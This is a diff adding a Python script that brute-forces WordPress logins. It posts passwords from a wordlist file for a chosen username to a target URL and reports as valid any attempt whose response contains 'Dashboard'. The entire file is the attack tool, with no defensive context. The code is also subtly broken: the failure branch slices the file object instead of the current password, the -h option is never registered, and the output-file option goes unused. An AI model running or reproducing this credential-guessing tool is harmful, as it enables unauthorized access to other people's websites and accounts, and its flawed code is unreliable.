@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+import requests, re, sys, getopt
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+def main():
+    login = ''
+    password = ''
+    url = ''
+    outputfile = ''
+    try:
+        opts, args = getopt.getopt(sys.argv[1:],'l:p:u:o:')
+    except getopt.GetoptError:
+        print(sys.argv[0] + ' -o <outputfile> -l <login> -p <password-file> -u <url>')
+        sys.exit(2)
+    for o, a in opts:
+        if o == "-h":
+            print (sys.argv[0] + ' testest -o <outputfile> -l <login> -p <password-file> -u <url>')
+            sys.exit()
+        if o in ("-l", "--login"):
+            login = a
+        if o in ("-p", "--password"):
+            password = open(a)
+        if o in ("-u", "--url"):
+            url = a
+    s = requests.session()
+    for passwords in password:
+        r = s.post(url)
+        logindata = {'log':login,'pwd':passwords[:-1],'wp-submit':'Log+In','testcookie':'1'}
+        r = s.post(url, data=logindata)
+        if "Dashboard" in r.text:
+            print("Valid Login %s:%s" % (login,passwords[:-1]))
+        else:
+            print("Failed %s:%s" % (login,password[:-1]))
+            s.cookies.clear()
+if __name__ == "__main__":
+    main()
